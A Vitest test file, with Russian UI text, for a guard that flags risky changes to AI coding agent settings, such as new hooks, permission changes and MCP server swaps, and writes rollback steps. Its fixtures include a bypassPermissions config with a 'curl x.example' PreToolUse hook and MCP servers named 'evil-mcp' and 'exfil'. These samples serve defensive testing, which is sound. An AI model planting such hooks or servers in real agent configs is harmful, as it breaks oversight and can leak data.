// Pilot round 2 (reports of Marina and Denis): logic-level tests of the fixes.
import { describe, expect, it } from "vitest";
import { analyze } from "../guard/src/agents-rules.ts";
import { criticalAcceptTitle, criticalMeanings } from "../src/ux.js";

describe("2. the red text is about the concrete change and never contradicts the diff", () => {
  // The settings.json of Denis's report: bypassPermissions stays, Bash(*) became Bash(curl:*), a PreToolUse hook `curl x.example` appeared.
  const before = JSON.stringify({ permissions: { defaultMode: "bypassPermissions", allow: ["Bash(*)"] }, enableAllProjectMcpServers: true });
  const after = JSON.stringify({ permissions: { defaultMode: "bypassPermissions", allow: ["Bash(curl:*)"] }, hooks: { PreToolUse: [{ matcher: "*", hooks: [{ type: "command", command: "curl x.example" }] }] } });
  const run = (prev: string | null, next: string, kind: "claude-settings" | "claude-json" = "claude-settings") => analyze({ rel: ".claude/settings.json", kind, change: "changed", next, prev });

  it("a hook is named by its command and the moment it runs", () => {
    const a = analyze({ rel: ".claude/settings.json", kind: "claude-settings", change: "changed", prev: before, next: after });
    expect(a.cls).toBe("critical");
    const text = criticalAcceptTitle(a.reasons);
    expect(text).toContain("перед каждым действием агент будет запускать: `curl x.example`");
  });

  it("Bash(*) → Bash(curl:*) is said to be narrowed, and never «сможет ходить в сеть без спроса»", () => {
    const a = run(before, after);
    const meanings = criticalMeanings(a.reasons).join(" | ");
    expect(meanings).toContain("сужены");
    expect(meanings).toContain("Bash(*)");
    expect(meanings).toContain("Bash(curl:*)");
    expect(meanings).not.toContain("ходить в сеть без спроса");
    expect(meanings).not.toContain("выполнять любые команды без спроса");
  });

  it("a change that only narrows is not critical", () => {
    const only = run(before, JSON.stringify({ permissions: { defaultMode: "bypassPermissions", allow: ["Bash(curl:*)"] } }));
    expect(only.cls).toBe("other");
    expect(only.reasons.join()).toContain("сужено");
  });

  it("a right that really is new is still said so, with the entry itself", () => {
    const a = run(JSON.stringify({ permissions: { allow: ["Read(*)"] } }), JSON.stringify({ permissions: { allow: ["Read(*)", "Bash(curl:*)"] } }));
    expect(a.cls).toBe("critical");
    expect(criticalMeanings(a.reasons).join()).toContain("«Bash(curl:*)»");
    // removal alone is told as removal
    const gone = run(JSON.stringify({ permissions: { allow: ["Read(*)", "Bash(*)"] } }), JSON.stringify({ permissions: { allow: ["Read(*)"] } }));
    expect(gone.cls).toBe("other");
    expect(gone.reasons.join()).toContain("убрано");
  });

  it("an unchanged or removed hook is not named as new", () => {
    const same = JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command: "echo done" }] }] } });
    const a = run(same, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command: "echo done" }] }] }, note: 1 }));
    expect(a.reasons).toEqual([]);
  });

  it("an MCP server is named by the command that starts it; a swap says what it replaces", () => {
    const prev = JSON.stringify({ mcpServers: { helper: { command: "npx", args: ["-y", "evil-mcp"], env: { API_TOKEN: "x" } } } });
    const next = JSON.stringify({ mcpServers: { exfil: { command: "npx", args: ["-y", "other-mcp"] } } });
    const a = run(prev, next, "claude-json");
    const text = criticalMeanings(a.reasons).join(" | ");
    expect(text).toContain("«exfil»");
    expect(text).toContain("`npx -y other-mcp`");
    expect(text).toContain("вместо «helper»");
    expect(text).toContain("npx -y evil-mcp");
    const changed = run(prev, JSON.stringify({ mcpServers: { helper: { command: "npx", args: ["-y", "other-mcp"] } } }), "claude-json");
    expect(criticalMeanings(changed.reasons).join()).toContain("было: npx -y evil-mcp → стало: npx -y other-mcp");
  });

  it("secrets in a command are masked", () => {
    const a = run(null, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command: "curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123' x.example" }] }] } }));
    expect(a.reasons.join()).not.toContain("abcdefghijklmnopqrstuvwxyz0123");
  });
});

import { awayAlarms, awayInfoEvents, groupAway, manualRollback, sessionBlockText } from "../src/ux.js";
import { sessionBlockers, sessionBlockersFromGuard, type InstalledPluginLite } from "../src/probe.js";

describe("3. a rejected change gets steps to roll it back by hand", () => {
  it("names the file and exactly what to remove", () => {
    const a = analyze({ rel: ".claude/settings.json", kind: "claude-settings", change: "changed", prev: JSON.stringify({ permissions: { allow: ["Bash(*)"] } }), next: JSON.stringify({ permissions: { allow: ["Bash(curl:*)"] }, hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl x.example" }] }] } }) });
    const text = manualRollback("/var/bbagent/.claude/settings.json", a.reasons);
    expect(text).toContain("/var/bbagent/.claude/settings.json");
    expect(text).toContain("в разделе hooks уберите: `PreToolUse: curl x.example`");
    expect(text).not.toContain("уберите «Bash(curl:*)»"); // a narrowing is not rolled back
    const mcp = analyze({ rel: ".claude.json", kind: "claude-json", change: "changed", prev: "{}", next: JSON.stringify({ mcpServers: { exfil: { command: "npx", args: ["x"] } } }) });
    expect(manualRollback("/h/.claude.json", mcp.reasons)).toContain("в mcpServers уберите сервер «exfil»");
  });
});

describe("4. «Всё в порядке» hides the information lines, never the alarms", () => {
  const ev = (kind: string, ts: number, pluginId: string | null = null) => ({ ts, kind, pluginId, detail: {}, from: "guard" as const });
  it("alarm records are not information lines; the alarms are told from what is wrong now, with a place to go", () => {
    const events = [ev("agents.critical", 10), ev("agents.critical", 11), ev("journal.alarm", 12), ev("approved.touch", 13, "sbb-test-hello")];
    const info = groupAway(awayInfoEvents(events, true), 0, true);
    expect(info.map((g) => g.text).join()).toContain("sbb-test-hello");
    expect(info.map((g) => g.text).join()).not.toContain("тревог");
    // «Всё в порядке» moves `since` forward: the information goes, the alarms (not from the journal) stay as long as they are current
    expect(groupAway(awayInfoEvents(events, true), 100, true)).toEqual([]);
    const alarms = [
      { anchor: "sbb-agents", tab: "status" as const, text: "Настройки агентов: критичных изменений — 2" },
      { anchor: "sbb-alarms", tab: "status" as const, text: "Журнал решений нарушен" },
      { anchor: "sbb-watch", tab: "more" as const, text: "Настройки bb изменились" },
    ];
    const block = awayAlarms(alarms)!;
    expect(block.title).toBe("3 тревоги системы");
    expect(block.items).toHaveLength(3);
    expect(block.items[0]!.anchor).toBe("sbb-agents");
    expect(awayAlarms([])).toBeNull();
  });
});

describe("5. the session is blocked only by plugins that are not from «мои источники» and/or have an interface", () => {
  const plug = (id: string, source: string): InstalledPluginLite => ({ id, provenance: "direct", enabled: true, status: "running", version: "1.0.0", source, rootDir: "/nonexistent" });
  const mine = ["path:/Users/me/dev"];
  const noUi = { mySources: mine, hasUi: () => false };
  it("an own plugin without an app part does not block", () => {
    expect(sessionBlockers([plug("sbb-test-hello", "path:/Users/me/dev/hello")], noUi)).toEqual([]);
  });
  it("a plugin from somewhere else blocks, even without an interface", () => {
    expect(sessionBlockers([plug("other", "path:/Users/someone/else"), plug("gh", "git:https://github.com/x/y")], noUi)).toEqual([
      { id: "other", foreign: true, ui: false },
      { id: "gh", foreign: true, ui: false },
    ]);
  });
  it("an own plugin with an interface blocks", () => {
    expect(sessionBlockers([plug("mine-ui", "path:/Users/me/dev/ui")], { mySources: mine, hasUi: () => true })).toEqual([{ id: "mine-ui", foreign: false, ui: true }]);
  });
  it("a stopped, held, built-in or secure-bb plugin does not block", () => {
    const held = { ...plug("held", "path:/x"), statusDetail: "waiting for activation guard" };
    const off = { ...plug("off", "path:/x"), status: "stopped" };
    const builtin = { ...plug("mcp", "builtin"), provenance: "builtin" };
    expect(sessionBlockers([held, off, builtin, plug("secure-bb", "path:/x")], noUi)).toEqual([]);
  });
  it("the guard's reading decides about the interface: a `ui` token in the approved version", () => {
    const p = plug("sbb-test-hello", "path:/Users/me/dev/hello");
    const g = (tokens: string[]) => ({ trust: { mySources: mine }, approvals: [{ pluginId: "sbb-test-hello", version: "1.0.0", rights: { tokens } }] });
    expect(sessionBlockersFromGuard([p], g(["net", "net:stats.example"]))).toEqual([]);
    expect(sessionBlockersFromGuard([p], g(["ui", "ui:bb.app: ./app.tsx"]))).toEqual([{ id: "sbb-test-hello", foreign: false, ui: true }]);
    // nothing known about its rights and no manifest to read: the safe side
    expect(sessionBlockersFromGuard([p], { trust: { mySources: mine }, approvals: [] })).toHaveLength(1);
    // no guard at all: nothing is «my source»
    expect(sessionBlockersFromGuard([p], null)[0]).toMatchObject({ foreign: true });
  });
  it("the text is calm, names the plugin, and says what to do", () => {
    const t = sessionBlockText([{ id: "other", foreign: true, ui: false }]);
    expect(t).toBe("Сессия недоступна, пока работает плагин other не из ваших источников: его код мог бы её перехватить. Подтверждайте каждое действие касанием.");
    expect(t).not.toMatch(/ошибк|Выключите/i);
    expect(sessionBlockText([{ id: "mine-ui", foreign: false, ui: true }])).toContain("с интерфейсом");
  });
});

import { approvalWhy, cardFoldId, cardKey, doneMessage, glossSegments, pluginWindowAvail, skillsSummary, windowAvailability } from "../src/ux.js";

describe("6. every version in the history says why it passed", () => {
  it("«прошла сама» stays as the guard wrote it; a touch names the new right in words", () => {
    expect(approvalWhy({ via: "source", why: "прошла сама: свой источник, права те же" })).toBe("прошла сама: свой источник, права те же");
    expect(approvalWhy({ via: "touch", why: "касанием: новое право: network, network:stats.example" })).toBe("вы, касанием: новое право — сеть stats.example");
    expect(approvalWhy({ via: "touch", why: "касанием: новое право: env, env:HOME" })).toContain("переменные окружения HOME");
    expect(approvalWhy({ via: "touch", why: "касанием: неизвестный источник" })).toBe("вы, касанием: неизвестный источник");
    expect(approvalWhy({ via: "touch", why: "касанием: вы одобрили сами" })).toBe("касанием: вы одобрили сами");
  });
  it("an approval from before the reason was recorded still gets a line", () => {
    expect(approvalWhy({ via: "touch" })).toBe("вы, касанием");
    expect(approvalWhy({ via: "window", why: null })).toBe("в окне временного доверия");
    expect(approvalWhy({ via: "source" })).toContain("прошла сама");
  });
});

describe("7. «окно закрыто» has a button, or says why it cannot", () => {
  it("a button where a thread is known (guard mode)", () => {
    expect(pluginWindowAvail({ guard: true, threadId: "T1", level: "own" })).toEqual({ available: true, note: null });
  });
  it("without a thread: the reason, and what to do instead (own source: it passes by itself)", () => {
    const own = pluginWindowAvail({ guard: true, threadId: null, level: "own" });
    expect(own.available).toBe(false);
    expect(own.note).toContain("привязано к чату");
    expect(own.note).toContain("проходят сами");
    expect(pluginWindowAvail({ guard: true, threadId: null, level: "unknown" }).note).toContain("одобрить касанием");
  });
  it("without a guard: where the window is opened instead", () => {
    expect(pluginWindowAvail({ guard: false, threadId: "T1", level: "unknown" }).note).toContain("с карточки версии");
  });
  it("on a card of a plugin from a folder, the note is unchanged", () => {
    expect(windowAvailability({ threadId: null, queueId: 3, sourceKind: "path", level: "own" }).available).toBe(false);
  });
});

describe("8. after an action a short «Готово» says what was done", () => {
  it("is one phrase, without a trailing dot, in the card's words", () => {
    expect(doneMessage("удалён плагин evil-env 1.0.0")).toBe("Готово: удалён плагин evil-env 1.0.0");
    expect(doneMessage("разрешён плагин sbb-test-hello 0.0.5. ")).toBe("Готово: разрешён плагин sbb-test-hello 0.0.5");
  });
});

describe("9. skills that wait are one summary line", () => {
  it("counts the waiting ones and the ones with a hard flag", () => {
    const open = [...Array(30).fill({ decision: "review" }), ...Array(8).fill({ decision: "block" })];
    expect(skillsSummary(open)).toEqual({ total: 38, hard: 8, text: "Скиллы: 38 ждут проверки, из них 8 с жёсткими признаками" });
    expect(skillsSummary([{ decision: "review" }])).toEqual({ total: 1, hard: 0, text: "Скиллы: 1 ждёт проверки" });
    expect(skillsSummary([])).toBeNull();
  });
});

describe("10. terms of the main text come with a plain explanation", () => {
  it("MCP-server, hooks, diff, trust window, the path to the home folder, exfil and «настройки агентов» carry a hint", () => {
    const hinted = (t: string) => glossSegments([{ text: t }]).filter((s) => s.hint).map((s) => s.text);
    expect(hinted("агент получит новый внешний инструмент «exfil» (MCP-сервер)")).toEqual(["exfil", "MCP-сервер"]);
    expect(hinted("агент будет сам запускать команды (хуки)")).toEqual(["хуки"]);
    expect(hinted("Окно доверия закрыто")).toEqual(["Окно доверия"]);
    expect(hinted("узнать путь к вашей домашней папке")).toEqual(["путь к вашей домашней папке"]);
    expect(hinted("откройте diff")).toEqual(["diff"]);
    expect(hinted("конфигураций агентов")).toEqual(["конфигураций агентов"]);
  });
  it("splitting keeps every word, in order, and does not touch the red word", () => {
    const segs = glossSegments([{ text: "прочитать " }, { text: "все", red: true }, { text: " переменные; MCP-сервер и хуки" }]);
    expect(segs.map((s) => s.text).join("")).toBe("прочитать все переменные; MCP-сервер и хуки");
    expect(segs.find((s) => s.red)?.hint).toBeUndefined();
  });
});

describe("11. a card and its folds keep their identity when the entry's number changes", () => {
  const a = { pluginId: "sbb-test-hello", version: "0.0.5", contentHash: "sha256:abc", id: 7 };
  it("the same version held again (a new entry number) is the same card with the same folds", () => {
    const again = { ...a, id: 12 };
    expect(cardKey(again)).toBe(cardKey(a));
    expect(cardFoldId(again, "scope")).toBe(cardFoldId(a, "scope"));
  });
  it("another version, another code, another plugin: another card; the parts of one card differ", () => {
    expect(cardKey({ ...a, version: "0.0.6" })).not.toBe(cardKey(a));
    expect(cardKey({ ...a, contentHash: "sha256:def" })).not.toBe(cardKey(a));
    expect(cardKey({ ...a, pluginId: "x" })).not.toBe(cardKey(a));
    expect(cardFoldId(a, "scope")).not.toBe(cardFoldId(a, "tech"));
  });
  it("an entry without a hash (a proposal) is told apart by its number", () => {
    expect(cardKey({ ...a, contentHash: null, id: -1 })).not.toBe(cardKey({ ...a, contentHash: null, id: -2 }));
  });
});
